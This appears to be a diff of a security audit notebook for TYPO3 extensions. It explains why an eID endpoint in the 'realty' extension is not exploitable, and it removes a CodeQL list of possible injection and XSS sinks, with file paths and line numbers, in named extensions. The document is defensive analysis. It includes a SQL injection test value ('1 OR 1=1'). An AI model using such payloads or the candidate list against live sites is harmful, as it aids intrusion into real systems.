+Both request parameters are neutralized at the source (`(int)` and an `=== 'withNumber'` boolean), so no attacker-controlled string reaches any downstream sink. The SQLi / XSS / IDOR hunt on this eID is disproven below with the exact sinks.
+
+---
+
+## Analysis
+
+### SQL injection — sink exists but is unreachable (NOT exploitable)
+
+`DistrictSelector::render()` calls the mapper:
+
+```php
+foreach ($districtMapper->findAllByCityUid($cityUid) as $district) { ... }
+```
+
+**Unsafe sink** — `Mapper/class.tx_realty_Mapper_District.php:findAllByCityUid()`:
+```php
+public function findAllByCityUid($uid)
+{
+    return $this->findByWhereClause('city = ' . $uid, 'title ASC');   // raw concatenation
+}
+```
+
+This is textbook unsafe string concatenation into a WHERE clause. **However**, the only caller reachable from the eID is the dispatcher, which passes `$cityUid = (int)_GET('city')`. An integer cannot carry SQL metacharacters, so the injection is not reachable pre-auth. `$cityUid` also gates on `> 0`. There is no code path from the eID that feeds a non-integer into `findAllByCityUid`.
+
+`countByDistrict()` (Mapper/class.tx_realty_Mapper_RealtyObject.php) takes a `tx_realty_Model_District` object and an `$additionalWhereClause` that defaults to `''` and is not attacker-controlled on this path.
+
+### Reflected XSS in the rendered list (NOT exploitable)
+
+`DistrictSelector::render()` HTML-encodes both dynamic values:
+```php
+$options .= '<option value="' . $district->getUid() . '">' .   // uid is int from DB
+    htmlspecialchars($district->getTitle()) .                  // encoded
+    $displayedNumber . "</option>\n";
+```
+`getUid()` returns an integer DB uid and `getTitle()` is passed through `htmlspecialchars()`. No reflected request value is echoed into the response — the `city`/`type` inputs never appear in `$output`. No XSS.
+
+### IDOR (NOT a meaningful finding)
+
+The endpoint only enumerates public district records belonging to a city uid. There is no per-object authorization to bypass and no sensitive data returned (district title + public object counts), so there is no consequential IDOR.
+
+---
+
+## PoC
+
+None. `GET /index.php?eID=realty&city=1%20OR%201=1&type=withNumber` is evaluated as `city = 0` (the `(int)` cast turns `"1 OR 1=1"` into `1`, and any non-numeric string into `0`), so no injection occurs; a numeric `city` simply returns that city's district `<option>` list with encoded titles.
+
+## Known CVEs / advisories
+No dedicated public advisory (TYPO3-EXT-SA / GHSA / CVE) was found for `realty` / `oliverklee/realty` at v3.0.2 concerning this eID. (Oliver Klee has issued advisories for other extensions, e.g. TYPO3-EXT-SA-2022-006 for `seminars`, but none applicable here.) The raw-WHERE concatenation in `findAllByCityUid` should still be hardened defensively (`intval`/quoting) in case another caller ever passes untrusted input.
+
+**Sources:** [TYPO3 Security Advisories](https://typo3.org/help/security-advisories), [oliverklee/ext-realty (GitHub)](https://github.com/oliverklee/ext-realty)
 
 ## Known-CVE version map (without source)
 #### TYPO3 Extensions — Known-CVE / Advisory Version Map
@@ -1200,46 +1752,4 @@ is compared against the affected range of publicly known TYPO3 Security Advisori
 
 ## CodeQL mass-scan candidates (intra-extension, all 3350 exts)
 ```
-# 172 raw -> 159 after noise filter
-
-[XSS ] Reflected XSS        caretaker_caretaker_instance Classes/Controller/EidController.php:22
-[XSS ] Reflected XSS        causal_routing               Classes/Controller/EidController.php:35
-[XSS ] Reflected XSS        dl_yag                       Classes/Controller/AjaxController.php:503
-[CRIT] Code injection       blueways_bw-bookingmanager   Classes/Controller/Backend/EntryListModuleController.php:30
-[CRIT] Code injection       adgrafik_fal-ftp             Resources/Private/Script/.FalFtpRemoteService.php:18
-[CRIT] Code injection       ameos_ameos_form             Classes/Domain/Repository/Trait/SearchableRepository.php:20
-[CRIT] Code injection       ameos_ameos_form             Classes/Domain/Repository/Trait/SearchableRepository.php:49
-[CRIT] Code injection       aoe_extracache               modfunc1/class.tx_extracache_modfunc1.php:73
-[CRIT] SQL injection        aoepeople_realurl            Classes/Realurl.php:1955
-[CRIT] SQL injection        aoepeople_realurl            Classes/Realurl.php:1956
-[CRIT] SQL injection        aoepeople_realurl            Classes/Realurl.php:1957
-[CRIT] SQL injection        aoepeople_realurl            Classes/Realurl.php:1989
-[CRIT] SQL injection        aoepeople_realurl            Classes/Realurl.php:1990
-[CRIT] SQL injection        aoepeople_realurl            Classes/Realurl.php:2003
-[CRIT] SQL injection        aoepeople_realurl            Classes/Realurl.php:2004
-[CRIT] SQL injection        apache-solr-for-typo3_solr   Classes/Domain/Index/Queue/QueueItemRepository.php:629
-[CRIT] SQL injection        apache-solr-for-typo3_solr   Classes/Domain/Index/Queue/QueueItemRepository.php:836
-[CRIT] SQL injection        apache-solr-for-typo3_solr   Classes/Domain/Search/Query/AbstractQueryBuilder.php:82
-[CRIT] SQL injection        apache-solr-for-typo3_solr   Classes/Domain/Search/Query/QueryBuilder.php:533
-[CRIT] SQL injection        apache-solr-for-typo3_solr   Classes/Domain/Search/Statistics/StatisticsRepository.php:193
-[CRIT] SQL injection        apache-solr-for-typo3_solr   Classes/Domain/Search/Statistics/StatisticsRepository.php:194
-[CRIT] SQL injection        apache-solr-for-typo3_solr   Classes/Domain/Search/Statistics/StatisticsRepository.php:195
-[CRIT] SQL injection        apache-solr-for-typo3_solr   Classes/IndexQueue/Initializer/AbstractInitializer.php:152
-[CRIT] SQL injection        apache-solr-for-typo3_solr   Classes/Search/AccessComponent.php:50
-[CRIT] SQL injection        apache-solr-for-typo3_solr   Classes/Search/ElevationComponent.php:39
-[CRIT] SQL injection        apache-solr-for-typo3_solr   Classes/Search/GroupingComponent.php:44
-[CRIT] SQL injection        apache-solr-for-typo3_solr   Classes/Search/HighlightingComponent.php:36
-[CRIT] SQL injection        apache-solr-for-typo3_solr   Classes/Search/RelevanceComponent.php:46
-[CRIT] SQL injection        apache-solr-for-typo3_solr   Classes/Search/SpellcheckingComponent.php:37
-[CRIT] SQL injection        apache-solr-for-typo3_solr   Classes/Search/SortingComponent.php:66
-[CRIT] SQL injection        apache-solr-for-typo3_solr   Classes/Search/StatisticsComponent.php:53
-[CRIT] SQL injection        apache-solr-for-typo3_solr   Classes/System/Records/Queue/EventQueueItemRepository.php:67
-[XSS ] Reflected XSS        aoepeople_crawler            Classes/Controller/Backend/BackendModuleStartCrawlingController.php:135
-[CRIT] File inclusion       b13_environment              Includes/Bootstrap/InitializeContext.php:68
-[CRIT] File inclusion       b13_environment              Includes/Bootstrap/InitializeContext.php:74
-[CRIT] File inclusion       b13_environment              Includes/Bootstrap/InitializeContext.php:80
-[CRIT] SQL injection        auba_cms-census              Classes/Domain/Repository/UrlRepository.php:131
-[CRIT] SQL injection        azich_direct-mail            Classes/DirectMailUtility.php:224
-[CRIT] SQL injection        azich_direct-mail            Classes/DirectMailUtility.php:225
-[CRIT] SQL injection        azich_direct-mail            Classes/DirectMailUtility.php:239
 ```
